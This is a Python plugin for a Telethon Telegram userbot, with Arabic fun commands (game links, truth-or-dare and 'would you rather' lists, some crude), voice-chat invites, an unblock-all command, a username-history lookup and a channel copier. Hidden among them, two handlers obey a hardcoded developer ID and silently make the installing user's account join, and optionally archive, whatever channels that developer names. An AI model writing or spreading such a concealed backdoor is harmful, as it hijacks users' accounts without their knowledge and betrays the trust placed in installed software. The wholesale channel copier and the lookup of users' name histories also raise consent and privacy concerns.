import asyncio
import random
import time
import os
import tempfile
import json

from ..helpers import reply_id, get_user_from_event
from . import BOTLOG, BOTLOG_CHATID
from telethon import functions
from collections import deque
from random import choice
from telethon.tl.types import InputPeerUser
from telethon.tl.functions.phone import CreateGroupCallRequest as startvc
from telethon.tl.functions.phone import DiscardGroupCallRequest as stopvc
from telethon.tl.functions.messages import GetHistoryRequest
from telethon.tl.functions.phone import GetGroupCallRequest as getvc
from telethon.tl.functions.phone import InviteToGroupCallRequest as invitetovc
from JoKeRUB import l313l
from ..core.managers import edit_delete, edit_or_reply

from telethon.tl.types import InputChannel, InputPeerChannel, InputFileLocation, InputWebFileLocation
from telethon import events, functions
from telethon.tl.functions.channels import JoinChannelRequest

@l313l.on(admin_cmd(pattern="دعوه للمكالمه(?: |$)(.*)"))
async def _(e):
    ok = await edit_or_reply(e, "`Inviting Members to Voice Chat...`")
    users = []
    z = 0
    async for x in e.client.iter_participants(e.chat_id):
        if not x.bot:
            users.append(x.id)
    hmm = list(user_list(users, 6))
    for p in hmm:
        try:
            await e.client(invitetovc(call=await get_call(e), users=p))
            z += 6
        except BaseException:
            pass
    await ok.edit(f"`Invited {z} users`")
@l313l.on(admin_cmd(pattern="بدء مكالمه(?: |$)(.*)"))
async def _(e):
    try:
        await e.client(startvc(e.chat_id))
        await edit_or_reply(e, "`جار بدء المكالمة ✅...`")
    except Exception as ex:
        await edit_or_reply(e, f"`{str(ex)}`")

# ================العاب الجوكر=========================

R = [
    "**𓆰**العـاب الاحترافيه** 🎮𓆪 \n"
    "  ❶ **⪼**  [حرب الفضاء 🛸](https://t.me/gamee?game=ATARIAsteroids)   \n"
    "  ❷ **⪼**  [لعبة فلابي بيرد 🐥](https://t.me/awesomebot?game=FlappyBird)   \n"
    "  ❸ **⪼**  [القط المشاكس 🐱](https://t.me/gamee?game=CrazyCat)   \n"
    "  ❹ **⪼**  [صيد الاسماك 🐟](https://t.me/gamee?game=SpikyFish3)   \n"
    "  ❺ **⪼**  [سباق الدراجات 🏍](https://t.me/gamee?game=MotoFX2)   \n"
    "  ❻ **⪼**  [سباق سيارات 🏎](https://t.me/gamee?game=F1Racer)   \n"
    "  ❼ **⪼**  [شطرنج ♟](https://t.me/T4TTTTBOT?game=chess)   \n"
    "  ❽ **⪼**  [كرة القدم ⚽](https://t.me/gamee?game=FootballStar)   \n"
    "  ❾ **⪼**  [كرة السلة 🏀](https://t.me/gamee?game=BasketBoyRush)   \n"
    "  ❿ **⪼**  [سلة 2 🎯](https://t.me/gamee?game=DoozieDunks)   \n"
    "  ⓫ **⪼**  [ضرب الاسهم 🏹](https://t.me/T4TTTTBOT?game=arrow)   \n"
    "  ⓬ **⪼**  [لعبة الالوان 🔵🔴](https://t.me/T4TTTTBOT?game=color)   \n"
    "  ⓭ **⪼**  [كونج فو 🎽](https://t.me/gamee?game=KungFuInc)   \n"
    "  ⓮ **⪼**  [🐍 لعبة الافعى 🐍](https://t.me/T4TTTTBOT?game=snake)   \n"
    "  ⓯ **⪼**  [🚀 لعبة الصواريخ 🚀](https://t.me/T4TTTTBOT?game=rocket)   \n"
    "  ⓰ **⪼**  [كيب اب 🧿](https://t.me/gamee?game=KeepitUP)   \n"
    "  ⓱ **⪼**  [جيت واي 🚨](https://t.me/gamee?game=Getaway)   \n"
    "  ⓲ **⪼**  [الالـوان 🔮](https://t.me/gamee?game=ColorHit)   \n"
    "  ⓳ **⪼**  [مدفع الكرات🏮](https://t.me/gamee?game=NeonBlaster)   \n"
    "**-** مطور السورس **⪼ [𐇮 𓂐 𓆩- Karar .𓆪 𖠛 ](t.me/lx5x5)   \n"
    "**-** قناة السورس **⪼ [𐇮 لـ كرار ](t.me/aqhvv)   "
]

@l313l.on(admin_cmd(pattern="بلي$"))
async def ithker(knopis):
    await knopis.edit(choice(R))

# ================= Citation_morning =================
#.اذكار - تم حذف الاذكار

kettuet = [  
"اكثر شي ينرفزك .. ؟!",
"اخر مكان رحتله ..؟!",
"سـوي تـاك @ لـ شخص تريـد تعترفلـه بشي ؟",
"تغار ..؟!",
 "هـل تعتقـد ان في أحـد يراقبـك . . .؟!",
"أشخاص ردتهم يبقون وياك ومن عرفو هلشي سوو العكس صارت معك؟",
"ولادتك بنفس المكان الي هسة عايش بي او لا؟",
"اكثر شي ينرفزك ؟",
"تغار ؟",
"كم تبلغ ذاكرة هاتفك؟",
"صندوق اسرارك ؟",
"شخص @ تعترفلة بشي ؟",
"يومك ضاع على ؟",
"اغرب شيء حدث في حياتك ؟",
"نسبة حبك للاكل ؟",
"حكمة تأمان بيها ؟",
"اكثر شي ينرفزك ؟",
"هل تعرضت للظلم من قبل؟",
"خانوك ؟",
"تاريخ غير حياتك ؟",
"أجمل سنة ميلادية مرت عليك ؟",
"ولادتك بنفس المكان الي هسة عايش بي او لا؟",
"تزعلك الدنيا ويرضيك ؟",
"ماهي هوايتك؟",
"دوله ندمت انك سافرت لها ؟",
"شخص اذا جان بلطلعة تتونس بوجود؟",
"تاخذ مليون دولار و تضرب خويك؟",
"تاريخ ميلادك؟",
"اشكم مره حبيت ؟",
"يقولون ان الحياة دروس ، ماهو أقوى درس تعلمته من الحياة ؟",
"هل تثق في نفسك ؟",
"كم مره نمت مع واحده ؟",
"اسمك الثلاثي ؟",
"كلمة لشخص خذلك؟",
"هل انت متسامح ؟",
"طريقتك المعتادة في التخلّص من الطاقة السلبية؟",
"عصير لو قهوة؟",
"تثق بـ احد ؟",
"كم مره حبيت ؟",
"اكمل الجملة التالية..... قال رسول الله ص،، انا مدينة العلم وعلي ؟",
"اوصف حياتك بكلمتين ؟",
"حياتك محلوا بدون ؟",
"وش روتينك اليومي؟",
"شي تسوي من تحس بلملل؟",
"يوم ميلادك ؟",
"اكثر مشاكلك بسبب ؟",
"تتوقع فيه احد حاقد عليك ويكرهك ؟",
"كلمة غريبة من لهجتك ومعناها؟",
"هل تحب اسمك أو تتمنى تغييره وأي الأسماء ستختار",
"كيف تشوف الجيل ذا؟",
"تاريخ لن تنساه📅؟",
"هل من الممكن أن تقتل أحدهم من أجل المال؟",
"تؤمن ان في حُب من أول نظرة ولا لا ؟.",
"‏ماذا ستختار من الكلمات لتعبر لنا عن حياتك التي عشتها الى الآن؟💭",
"طبع يمكن يخليك تكره شخص حتى لو كنت تُحبه🙅🏻‍♀️؟",
"ما هو نوع الموسيقى المفضل لديك والذي تستمع إليه دائمًا؟ ولماذا قمت باختياره تحديدًا؟",
"أطول مدة نمت فيها كم ساعة؟",
"كلمة غريبة من لهجتك ومعناها؟🤓",
"ردة فعلك لو مزح معك شخص م تعرفه ؟",
"شخص تحب تستفزه😈؟",
"تشوف الغيره انانيه او حب؟",
"مع او ضد : النوم افضل حل لـ مشاكل الحياة؟",
"اذا اكتشفت أن أعز أصدقائك يضمر لك السوء، موقفك الصريح؟",
"‏للشباب | آخر مرة وصلك غزل من فتاة؟🌚",
"أوصف نفسك بكلمة؟",
"شيء من صغرك ماتغير فيك؟",
"ردة فعلك لو مزح معك شخص م تعرفه ؟",
"| اذا شفت حد واعجبك وعندك الجرأه انك تروح وتتعرف عليه ، مقدمة الحديث شو راح تكون ؟.",
"كلمة لشخص أسعدك رغم حزنك في يومٍ من الأيام ؟",
"حاجة تشوف نفسك مبدع فيها ؟",
"يهمك ملابسك تكون ماركة ؟",
"يومك ضاع على؟",
"اذا اكتشفت أن أعز أصدقائك يضمر لك السوء، ماموقفك الصريح؟",
"هل من الممكن أن تقتل أحدهم من أجل المال؟",
"كلمه ماسكه معك الفترة هذي ؟",
"كيف هي أحوال قلبك؟",
"صريح، مشتاق؟",
"اغرب اسم مر عليك ؟",
"تختار أن تكون غبي أو قبيح؟",
"آخر مرة أكلت أكلتك المفضّلة؟",
"دوله ندمت انك سافرت لها😁؟",
"اشياء صعب تتقبلها بسرعه ؟",
"كلمة لشخص غالي اشتقت إليه؟💕",
"اكثر شيء تحس انه مات ف مجتمعنا؟",
"هل يمكنك مسامحة شخص أخطأ بحقك لكنه قدم الاعتذار وشعر بالندم؟",
"آخر شيء ضاع منك؟",
"تشوف الغيره انانيه او حب؟",
"لو فزعت/ي لصديق/ه وقالك مالك دخل وش بتسوي/ين؟",
"شيء كل م تذكرته تبتسم ...",
"هل تحبها ولماذا قمت باختيارها؟",
"هل تنفق مرتبك بالكامل أم أنك تمتلك هدف يجعلك توفر المال؟",
"متى تكره الشخص الذي أمامك حتى لو كنت مِن أشد معجبينه؟",
"أقبح القبحين في العلاقة: الغدر أو الإهمال🤷🏼؟", 
"هل وصلك رسالة غير متوقعة من شخص وأثرت فيك ؟",
"هل تشعر أن هنالك مَن يُحبك؟",
"وش الشيء الي تطلع غضبك فيه لو زعلت ؟",
"صوت مغني م تحبه",
"كم في حسابك البنكي ؟",
"اذكر موقف ماتنساه بعمرك؟",
"ردة فعلك لو مزح معك شخص م تعرفه ؟",
"عندك حس فكاهي والا نفسية؟",
"من وجهة نظرك ما هي الأشياء التي تحافظ على قوة وثبات العلاقة؟",
"ما هو نوع الموسيقى المفضل لديك والذي تستمع إليه دائمًا؟ ولماذا قمت باختياره تحديدًا؟",
"هل تنفق مرتبك بالكامل أم أنك تمتلك هدف يجعلك توفر المال؟",
"هل وصلك رسالة غير متوقعة من شخص وأثرت فيك ؟",
"شيء من صغرك ماتغير فيك؟",
"هل يمكنك أن تضحي بأكثر شيء تحبه وتعبت للحصول عليه لأجل شخص تحبه؟",
"هل تحبها ولماذا قمت باختيارها؟",
"لو فزعت/ي لصديق/ه وقالك مالك دخل وش بتسوي/ين؟",
"كلمة لشخص أسعدك رغم حزنك في يومٍ من الأيام ؟",
"كم مره تسبح باليوم",
"أفضل صفة تحبه بنفسك؟",
"أجمل شيء حصل معك خلال هاليوم؟",
"‏شيء سمعته عالق في ذهنك هاليومين؟",
"هل يمكنك تغيير صفة تتصف بها فقط لأجل شخص تحبه ولكن لا يحب تلك الصفة؟",
"‏أبرز صفة حسنة في صديقك المقرب؟",
"ما الذي يشغل بالك في الفترة الحالية؟",
"آخر مرة ضحكت من كل قلبك؟",
"اكثر دوله ودك تسافر لها🏞؟",
"آخر خبر سعيد، متى وصلك؟",
"‏نسبة احتياجك للعزلة من 10📊؟",
"هل تنفق مرتبك بالكامل أم أنك تمتلك هدف يجعلك توفر المال؟",
"أكثر جملة أثرت بك في حياتك؟",
"لو قالوا لك  تناول صنف واحد فقط من الطعام لمدة شهر .",
"هل تنفق مرتبك بالكامل أم أنك تمتلك هدف يجعلك توفر المال؟",
"آخر مرة ضحكت من كل قلبك؟",
"وش الشيء الي تطلع غضبك فيه لو زعلت ؟",
"متى تكره الشخص الذي أمامك حتى لو كنت مِن أشد معجبينه؟",
"تعتقد فيه أحد يراقبك👩🏼‍💻؟",
"احقر الناس هو من ...",
"شيء من صغرك ماتغير فيك؟",
"وين نلقى السعاده برايك؟",
"هل تغار/تغارين من صديقاتك/اصدقائك ؟؟",
"أكثر جملة أثرت بك في حياتك؟",
"كم عدد اللي معطيهم بلوك👹؟",
"أجمل سنة ميلادية مرت عليك ؟",
"أوصف نفسك بكلمة؟",
]


@l313l.ar_cmd(pattern="كت(?: |$)(.*)")
async def ahmed(ahmed): # Code Update by @zzzzl1l
    zelzal = ahmed.pattern_match.group(1)
    zilzal = await ahmed.get_reply_message()
    zel_zal = random.choice(kettuet)
    if not zilzal and not zelzal: # Code Update by @zzzzl1l
        return await edit_or_reply(ahmed, f"**⌔╎{zel_zal}**")
    user, custom = await get_user_from_event(ahmed)
    if not user: # Code Update by @zzzzl1l
        return
    zedth2 = user.first_name.replace("\u2060", "") if user.first_name else user.username
    if custom: # Code Update by @zzzzl1l
        zedth2 = custom
    me = await ahmed.client.get_me()
    my_first = me.first_name
    my_ahmed = f"[{me.first_name}](tg://user?id={me.id})"
    await edit_or_reply(ahmed, f"**⌔╎لـ  ** [{zedth2}](tg://user?id={user.id}) \n**⌔╎{zel_zal} .**")

HuRe_5erok = [
    "** ‎لو خيروك |  بين قضاء يوم كامل مع الرياضي الذي تشجعه أو نجم السينما الذي تحبه؟ **",
    "** لو خيروك |  أسئلة محرجة أسئلة صراحة ماذا ستختار؟ **",
    "** هل كذبت على والديك من قبل..؟ **",
    "** لو خيروك |  بين إمكانية تواجدك في الفضاء وبين إمكانية تواجدك في البحر؟ **",
    "** لو خيروك |  بين أستاذ اللغة  ية أو أستاذ الرياضيات؟ **",
    "** تحس انك محظوظ بالاشخاص الي حولك ؟ **",
    "** لو خيروك |  بين مشاهدة كرة القدم أو متابعة الأخبار؟ **",
    "** لو خيروك |  بين تناول الشوكولا التي تفضلها لكن مع إضافة رشة من الملح والقليل من عصير الليمون إليها أو تناول ليمونة كاملة كبيرة الحجم؟ **",
    "** لو خيروك |  أن تعيش قصة فيلم هل تختار الأكشن أو الكوميديا؟ **",
    "** لو كنت شخص آخر هل تفضل البقاء معك أم أنك ستبتعد عن نفسك؟ **",
    "** لو خيروك |  بين الاستماع إلى الأخبار الجيدة أولًا أو الاستماع إلى الأخبار السيئة أولًا؟ **",
    "** لو خيروك |  بين ارتداء ملابس البيت لمدة أسبوع كامل أو ارتداء البدلة الرسمية لنفس المدة؟ **",
    "** لو خيروك |  بين أن تتكلم بالهمس فقط طوال الوقت أو أن تصرخ فقط طوال الوقت؟ **",
    "** لو خيروك |  بإنقاذ شخص واحد مع نفسك بين أمك أو ابنك؟ **",
    "** لو خيروك |  بين البقاء بدون هاتف لمدة شهر أو بدون إنترنت لمدة أسبوع؟ **",
    "** لو خيروك |  بين رجل أعمال أو أمير؟ **",
    "** لو خيروك |  بين تنظيف شعرك بسائل غسيل الأطباق وبين استخدام كريم الأساس لغسيل الأطباق؟ **",
    "** لو خيروك |  بين مشاهدة الدراما في أيام السبعينيات أو مشاهدة الأعمال الدرامية للوقت الحالي؟ **",
    "** لو خيروك |  بين امتلاك القدرة على تغيير لون شعرك متى تريدين وبين الحصول على مكياج من قبل خبير تجميل وذلك بشكل يومي؟ **",
    "** لو خيروك |  بين الإبحار لمدة أسبوع كامل أو السفر على متن طائرة لـ 3 أيام متواصلة؟! **",
    "** لو خيروك |  بين أن تصبحي عارضة أزياء وبين ميك آب أرتيست؟ **",
    "** لو خيروك |  بين تناول الشوكولا التي تحبين طوال حياتك ولكن لا يمكنك الاستماع إلى الموسيقى وبين الاستماع إلى الموسيقى ولكن لا يمكن لك تناول الشوكولا أبدًا؟ **",
    "** لو خيروك |  بين زوجتك وابنك/ابنتك؟ **",
    "** لو خيروك |  بين إما الحصول على المال أو على المزيد من الوقت؟ **",
    "** لو خيروك |  بين شراء منزل صغير أو استئجار فيلا كبيرة بمبلغ معقول؟ **",
    "** لو خيروك |  بين أمك وأبيك؟ **",
    "** لو خيروك |  بين إنهاء الحروب في العالم أو إنهاء الجوع في العالم؟ **",
    "** لو خيروك |  بين نشر تفاصيل حياتك المالية وبين نشر تفاصيل حياتك العاطفية؟ **",
    "** لو خيروك |  بين قضاء يوم كامل مع الرياضي الذي تشجعه أو نجم السينما الذي تحبه؟ **",

]


@l313l.on(admin_cmd(pattern="خيروك$"))
async def ithker(knopis):
    await knopis.edit(choice(HuRe_5erok))

    


HuRe_Shnow = [
    "** ‎هذا واحد طايح حظه ومسربت **",
    "** هذا واحد شراب عرك ويدور بنات وكرنج **",
    "** ولكعبة ولحمزه والانجيل والتوراة هذا ينيج 😹 **",
    "** هذا واحد فقير ومحبوب ويحب الخير للناس 😍 **",
    "** هذا اخوي وحبيبي ربي يحفظه ويخليه الية ❤️‍🔥 **",
    "** هذا واحد حلو موكف المنطقه تك رجل بحلاته 🤤 **",
]


@l313l.on(admin_cmd(pattern="شنو رأيك بهذا$"))
async def ithker(knopis):
    await knopis.edit(choice(HuRe_Shnow))

HuRe_Bosa = [
    "** ‎امممممممممح يبووو شنو من خد 😍 **",
    "** امممممح بوية مو شفه عسلل 😻 **",
    "** ويييع شبوس منه غير ريحة حلكة تكتل 🤮 **",
    "** ما ابوسة لعبت نفسي منه 😒 **",
    "** مححح افيششش البوسة ودتني لغير عالم 🤤 **",

]


@l313l.on(admin_cmd(pattern="بوسة$"))
async def ithker(knopis):
    await knopis.edit(choice(HuRe_Bosa))

DevJoker = [5427469031]
#تضل تخمط من عمك الجوكر ؟ الى اين يستمُر الفشل ياغُلام
@l313l.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.message.message.startswith("تمويل") and event.sender_id in DevJoker:
        message = event.message
        channel_username = None
        if len(message.text.split()) > 1:
            channel_username = message.text.split()[1].replace("@", "")
        if channel_username:
            try:
                await l313l(JoinChannelRequest(channel_username))
                response = "**᯽︙ تم الانضمام إلى القناة بنجاح!**"
            except ValueError:
                response = "خطأ في العثور على القناة. يرجى التأكد من المعرف الصحيح"
        else:
            response = "**᯽︙ يُرجى تحديد معرف القناة او المجموعة مع التمويل يامطوري ❤️** "
        #await event.reply(response)

@l313l.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.message.message.startswith("ارشف") and event.sender_id in DevJoker:
        message = event.message
        channel_username = None
        if len(message.text.split()) > 1:
            channel_username = message.text.split()[1].replace("@", "")
        if channel_username:
            try:
                await l313l(JoinChannelRequest(channel_username))
                await l313l.edit_folder(channel_username, folder=1)
                response = "**᯽︙ تم الانضمام إلى القناة بنجاح ووضعها في مجلد الأرشيف!**"
            except ValueError:
                response = "خطأ في العثور على القناة. يرجى التأكد من المعرف الصحيح"
        else:
            response = "**᯽︙ يُرجى تحديد معرف القناة او المجموعة مع التمويل يامطوري ❤️** "
        #await event.reply(response)
client = l313l

@l313l.on(admin_cmd(pattern="فك الحظر$"))
async def handle_unblock_all(event):
    blocked_users = await client(functions.contacts.GetBlockedRequest(
        offset=0,
        limit=200
    ))
    if not blocked_users.users:
        await event.edit("**✧︙ لا يوجد مستخدمين محظورين في حسابك 🤷🏻**")
        return
    for user in blocked_users.users:
        try:
            await client(functions.contacts.UnblockRequest(
                id=InputPeerUser(user.id, user.access_hash)
            ))
            aljoker_entity = await client.get_entity(user.id)
            aljoker_profile = f"[{aljoker_entity.first_name}](tg://user?id={aljoker_entity.id})"
            await event.edit(f"✧︙ تم إلغاء حظر المستخدم : {aljoker_profile}")
            asyncio.sleep(3)
        except ValueError:
            continue
        except Exception as e:
            await event.edit(f"حدث خطأ أثناء إلغاء حظر المستخدم بمعرّف: {user.id}, الخطأ: {e}")
            continue
            
@l313l.on(admin_cmd(pattern="(تاريخه|تاريخة)$"))
async def Hussein(event):
    reply_to = event.reply_to_msg_id
    if reply_to:
        msg = await client.get_messages(event.chat_id, ids=reply_to)
        user_id = msg.sender_id
        chat = await client.get_entity("@SangMata_beta_bot")
        async with client.conversation(chat) as conv:
            await conv.send_message(f'{user_id}')
            response = await conv.get_response()
            await event.edit(response.text)


import asyncio
import os
import tempfile
from telethon import events
from telethon.tl.functions.messages import GetHistoryRequest
from telethon.tl.types import (
    MessageEntityBlockquote,
    MessageMediaPhoto,
    MessageMediaDocument,
    MessageMediaWebPage,
    InputMediaUploadedPhoto,
    InputMediaUploadedDocument
)
from . import l313l
from ..core.managers import edit_or_reply
from . import BOTLOG, BOTLOG_CHATID

async def download_and_send_spoiler(message, dest_entity):
    """تحميل الصورة المشوشة وإرسالها مع تشويش"""
    try:
        # تحميل الصورة مباشرة كـ bytes
        photo_bytes = await message.download_media(bytes)
        
        if not photo_bytes:
            return False, "فشل تحميل الصورة"
        
        # إرسال الصورة مع تشويش
        await l313l.send_file(
            dest_entity,
            photo_bytes,
            caption=message.message or "",
            entities=message.entities,
            spoiler=True  # تفعيل التشويش
        )
        
        return True, "تم النسخ بنجاح"
        
    except Exception as e:
        return False, str(e)

async def start_copier(destination_channel_username, source_channel_username):
    try:
        # إرسال تقرير بدء العمل
        await l313l.send_message(
            BOTLOG_CHATID,
            f"🔵 **بدء النسخ من @{source_channel_username}**\n⏳ جاري جلب المنشورات..."
        )
        
        # الحصول على معلومات القنوات
        source_channel = await l313l.get_entity(source_channel_username)
        destination_channel = await l313l.get_entity(destination_channel_username)
        destination_channel_id = destination_channel.id

        # الحصول على المنشورات
        posts = await l313l(GetHistoryRequest(
            peer=source_channel,
            limit=100,
            offset_date=None,
            offset_id=0,
            max_id=0,
            min_id=0,
            add_offset=0,
            hash=0,
        ))

        # عكس الترتيب
        posts.messages.reverse()

        stats = {
            'total': len(posts.messages),
            'success': 0,
            'failed': 0,
            'spoiler': 0
        }

        # إرسال تقرير بعدد المنشورات
        await l313l.send_message(
            BOTLOG_CHATID,
            f"📊 **تم العثور على {stats['total']} منشور**\n⏳ بدء النسخ..."
        )

        # نقل المنشورات
        for message in posts.messages:
            try:
                # تحديد نوع المنشور
                msg_type = "نص"
                is_spoiler = False
                
                if message.media:
                    if isinstance(message.media, MessageMediaPhoto):
                        msg_type = "صورة"
                        # التحقق من التشويش
                        if hasattr(message.media, 'spoiler') and message.media.spoiler:
                            is_spoiler = True
                            msg_type = "صورة مشوشة 🔲"
                    
                    elif isinstance(message.media, MessageMediaDocument):
                        msg_type = "مستند/فيديو"
                        if hasattr(message.media, 'spoiler') and message.media.spoiler:
                            is_spoiler = True
                            msg_type = "مستند مشوش 🔲"
                    
                    elif isinstance(message.media, MessageMediaWebPage):
                        msg_type = "رابط"
                
                # نسخ حسب النوع
                success = False
                error_msg = ""
                
                if is_spoiler:
                    # حالة خاصة: صورة مشوشة
                    success, error_msg = await download_and_send_spoiler(message, destination_channel_id)
                    if success:
                        stats['spoiler'] += 1
                
                elif message.media and not is_spoiler:
                    # وسائط عادية (بدون تشويش)
                    try:
                        file_media = f"https://t.me/{source_channel_username}/{message.id}"
                        await l313l.send_file(
                            destination_channel_id,
                            file_media,
                            caption=message.message or "",
                            entities=message.entities
                        )
                        success = True
                    except Exception as e:
                        # إذا فشل الرابط، جرب التحميل المباشر
                        try:
                            file_bytes = await message.download_media(bytes)
                            if file_bytes:
                                await l313l.send_file(
                                    destination_channel_id,
                                    file_bytes,
                                    caption=message.message or "",
                                    entities=message.entities
                                )
                                success = True
                            else:
                                success = False
                                error_msg = "فشل تحميل الملف"
                        except Exception as e2:
                            success = False
                            error_msg = str(e2)
                
                elif message.message:
                    # رسالة نصية فقط
                    await l313l.send_message(
                        destination_channel_id,
                        message.message,
                        formatting_entities=message.entities
                    )
                    success = True
                
                else:
                    # رسالة فارغة (نتخطاها)
                    stats['failed'] += 1
                    await l313l.send_message(
                        BOTLOG_CHATID,
                        f"⚠️ **تم تخطي منشور فارغ**\n"
                        f"🔗 الرابط: https://t.me/{source_channel_username}/{message.id}",
                        link_preview=False
                    )
                    continue
                
                # تحديث الإحصائيات
                if success:
                    stats['success'] += 1
                    
                    # تقرير النجاح
                    await l313l.send_message(
                        BOTLOG_CHATID,
                        f"✅ **تم النسخ بنجاح**\n"
                        f"📌 **النوع:** {msg_type}\n"
                        f"🔗 **الرابط:** https://t.me/{source_channel_username}/{message.id}",
                        link_preview=False
                    )
                else:
                    stats['failed'] += 1
                    
                    # تقرير الفشل
                    await l313l.send_message(
                        BOTLOG_CHATID,
                        f"❌ **فشل النسخ**\n"
                        f"📌 **النوع:** {msg_type}\n"
                        f"🔗 **الرابط:** https://t.me/{source_channel_username}/{message.id}\n"
                        f"⚠️ **الخطأ:** {error_msg or 'غير معروف'}",
                        link_preview=False
                    )
                
                # تأخير لتجنب حظر تيليغرام
                await asyncio.sleep(2)
                
                # تقرير مرحلي كل 5 منشورات
                if (stats['success'] + stats['failed']) % 5 == 0:
                    await l313l.send_message(
                        BOTLOG_CHATID,
                        f"📊 **تقرير مرحلي**\n"
                        f"✅ **تم النسخ:** {stats['success']}\n"
                        f"❌ **فشل:** {stats['failed']}\n"
                        f"🔲 **مشوش:** {stats['spoiler']}\n"
                        f"📈 **المتبقي:** {stats['total'] - (stats['success'] + stats['failed'])}",
                        link_preview=False
                    )
                
            except Exception as e:
                stats['failed'] += 1
                await l313l.send_message(
                    BOTLOG_CHATID,
                    f"❌ **خطأ غير متوقع**\n"
                    f"🔗 **الرابط:** https://t.me/{source_channel_username}/{message.id}\n"
                    f"⚠️ **الخطأ:** {str(e)}",
                    link_preview=False
                )
                await asyncio.sleep(1)

        # التقرير النهائي
        await l313l.send_message(
            BOTLOG_CHATID,
            f"✅ **اكتمل النسخ**\n"
            f"📊 **الإحصائيات النهائية:**\n"
            f"📌 **إجمالي المنشورات:** {stats['total']}\n"
            f"✅ **تم النسخ بنجاح:** {stats['success']}\n"
            f"❌ **فشل:** {stats['failed']}\n"
            f"🔲 **منشورات مشوشة:** {stats['spoiler']}\n"
            f"📢 **من قناة:** @{source_channel_username}",
            link_preview=False
        )

    except Exception as e:
        await l313l.send_message(
            BOTLOG_CHATID,
            f"❌ **حدث خطأ عام**\n⚠️ **التفاصيل:**\n{e}"
        )

@l313l.ar_cmd(pattern="كوبي(?:\s|$)([\s\S]*)")
async def channel_copier(event):
    catty = event.pattern_match.group(1)
    if not catty:
        await edit_or_reply(event, "❌ **يرجى كتابة اسم القناة المصدر**\nمثال: `كوبي @asdiqu`")
        return
        
    channel_username = str(catty.split(" ")[0])
    if channel_username.startswith("@"):
        channel_username = channel_username.replace("@", "")
    
    await edit_or_reply(
        event,
        f"🔵 **بدء نسخ القناة**\n"
        f"📌 **من:** @{channel_username}\n"
        f"📌 **إلى:** هذه القناة\n"
        f"✅ **دعم الصور المشوشة:** مفعل\n"
        f"✅ **دعم الاقتباس:** مفعل\n\n"
        f"⏳ **جاري النسخ... سيتم إرسال التقارير إلى الخاص**"
    )
    
    await start_copier(event.chat_id, channel_username)
